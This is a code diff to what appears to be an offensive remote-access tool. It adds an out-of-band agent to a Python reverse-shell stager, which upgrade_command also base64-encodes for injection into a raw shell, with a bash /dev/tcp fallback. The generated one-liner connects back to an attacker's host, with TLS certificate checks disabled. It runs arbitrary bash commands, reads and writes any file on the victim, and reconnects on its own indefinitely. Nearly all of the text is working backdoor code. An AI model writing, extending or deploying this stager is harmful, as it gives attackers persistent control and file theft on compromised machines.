@@ -66,27 +66,122 @@ def _stager(lhost: str, port: str, token: str, tls: bool) -> str:
     )
 
 
+def _oob_agent_body(lhost: str, port: str, token: str, tls: bool) -> str:
+    """Compact OOB agent body for the stager v2. Runs in a background
+    thread alongside the PTY loop. Speaks the framed protocol from
+    `recce/sessions/oob.py`. See that module's AGENT_SCRIPT for the
+    canonical (uncompressed) reference; this is a squashed inline
+    version for the one-liner stager."""
+    imports = "import socket,struct,subprocess,threading,time,os" + (",ssl" if tls else "")
+    connect = (
+        "raw=socket.socket();raw.connect((H,P));"
+        "s=ssl._create_unverified_context().wrap_socket(raw,server_hostname=H)"
+        if tls else "s=socket.socket();s.connect((H,P))"
+    )
+    # Types: EXEC=1, EXEC_RESULT=2, FILE_WRITE=3, FILE_ACK=4,
+    # FILE_READ=5, FILE_DATA=6, PING=7, PONG=8
+    return (
+        f"{imports}\n"
+        f'T="{token}";H="{lhost}";P={port}\n'
+        "lk=threading.Lock()\n"
+        "def rx(s,n):\n"
+        " b=b\"\"\n"
+        " while len(b)<n:\n"
+        "  c=s.recv(n-len(b))\n"
+        "  if not c:return None\n"
+        "  b+=c\n"
+        " return b\n"
+        "def sf(s,t,p=b\"\"):\n"
+        " with lk:\n"
+        "  try:s.sendall(struct.pack('!IB',len(p),t)+p)\n"
+        "  except:pass\n"
+        "def he(s,p):\n"
+        " try:\n"
+        "  r=subprocess.run(['bash','-c',p.decode('utf-8','replace')],capture_output=True,timeout=180)\n"
+        "  sf(s,2,struct.pack('!I',r.returncode&0xffffffff)+r.stdout+r.stderr)\n"
+        " except Exception as e:sf(s,2,struct.pack('!I',127)+str(e).encode('utf-8','replace')[:200])\n"
+        "def hw(s,p):\n"
+        " pl=struct.unpack('!I',p[:4])[0]\n"
+        " pt=p[4:4+pl].decode('utf-8','replace');d=p[4+pl:]\n"
+        " try:\n"
+        "  dd=os.path.dirname(pt)\n"
+        "  if dd:os.makedirs(dd,exist_ok=True)\n"
+        "  f=open(pt,'wb');f.write(d);f.close();sf(s,4,struct.pack('!I',len(d)))\n"
+        " except Exception as e:sf(s,4,b'\\xff'+str(e).encode('utf-8','replace')[:200])\n"
+        "def hr(s,p):\n"
+        " pl=struct.unpack('!I',p[:4])[0]\n"
+        " pt=p[4:4+pl].decode('utf-8','replace')\n"
+        " try:\n"
+        "  f=open(pt,'rb');d=f.read();f.close();sf(s,6,d)\n"
+        " except:sf(s,6,b'')\n"
+        "def oob_loop():\n"
+        " while 1:\n"
+        "  s=None\n"
+        "  try:\n"
+        f"   {connect}\n"
+        "   s.sendall(b'RECCE1 '+T.encode()+b' oob\\n')\n"
+        "   while 1:\n"
+        "    h=rx(s,5)\n"
+        "    if h is None:break\n"
+        "    L=struct.unpack('!I',h[:4])[0];t=h[4]\n"
+        "    p=rx(s,L) if L else b''\n"
+        "    if p is None:break\n"
+        "    if t==1:threading.Thread(target=he,args=(s,p),daemon=True).start()\n"
+        "    elif t==3:threading.Thread(target=hw,args=(s,p),daemon=True).start()\n"
+        "    elif t==5:threading.Thread(target=hr,args=(s,p),daemon=True).start()\n"
+        "    elif t==7:sf(s,8,p)\n"
+        "  except Exception:pass\n"
+        "  try:\n"
+        "   if s:s.close()\n"
+        "  except:pass\n"
+        "  time.sleep(2)\n"
+        "threading.Thread(target=oob_loop,daemon=True).start()"
+    )
+
+
+def _stager_v2(lhost: str, port: str, token: str, tls: bool) -> str:
+    """PTY stager + OOB agent side-by-side. The PTY loop is unchanged
+    (100% back-compat with the existing listener path); the OOB agent
+    starts in a background thread that opens a SEPARATE TCP connection
+    with a `RECCE1 <token> oob\\n` handshake. The listener recognises
+    that keyword and binds the connection to this session's
+    `oob_channel`, so quickrun / download / upload / enum use the
+    clean channel instead of shell-echoing base64 through the PTY."""
+    return _oob_agent_body(lhost, port, token, tls) + "\n" + _stager(lhost, port, token, tls)
+
+
 def python_stager(lhost: str, port: int, token: str) -> str:
     return _stager(lhost, str(port), token, tls=False)
+
+
+def python_stager_v2(lhost: str, port: int, token: str) -> str:
+    """PTY + OOB combined stager. See `_stager_v2`."""
+    return _stager_v2(lhost, str(port), token, tls=False)
 
 
 def python_tls_stager(lhost: str, port: int, token: str) -> str:
     return _stager(lhost, str(port), token, tls=True)
 
 
-def stager_template(tls: bool) -> str:
+def stager_template(tls: bool, oob: bool = True) -> str:
     """A `python3 -c '...'` one-liner with {LHOST}/{PORT}/{TOKEN} placeholders — the browser
-    fetches this and fills it client-side, so there's one source of truth for the payload."""
-    return "python3 -c '" + _stager("{LHOST}", "{PORT}", "{TOKEN}", tls) + "'"
+    fetches this and fills it client-side, so there's one source of truth for the payload.
+    `oob=True` includes the dedicated OOB agent alongside the PTY loop so quickrun/
+    download/upload/enum don't share the PTY channel."""
+    body = (_stager_v2 if oob else _stager)("{LHOST}", "{PORT}", "{TOKEN}", tls)
+    return "python3 -c '" + body + "'"
 
 
-def upgrade_command(lhost: str, port: int, token: str, tls: bool = False) -> str:
+def upgrade_command(lhost: str, port: int, token: str, tls: bool = False,
+                     oob: bool = True) -> str:
     """A single line to inject into a RAW shell, pwncat-style method detection:
       1. python (python3/python/python2) → full reconnecting-PTY stager (best)
       2. bash /dev/tcp → a reconnecting shell with the token but no PTY (very common fallback)
       3. neither → RECCE_NO_METHOD
-    Each backgrounds a self-healing loop, so the weak shell upgrades itself in place."""
-    body = _stager(lhost, str(port), token, tls)
+    Each backgrounds a self-healing loop, so the weak shell upgrades itself in place.
+    `oob=True` (default) uses the v2 stager that also runs the OOB agent so
+    control commands go over a separate channel."""
+    body = (_stager_v2 if oob else _stager)(lhost, str(port), token, tls)
     b64 = base64.b64encode(body.encode()).decode()
     # bash fallback: reconnecting (non-PTY) shell, announces the token WITHOUT the pty flag
     bash_fb = (
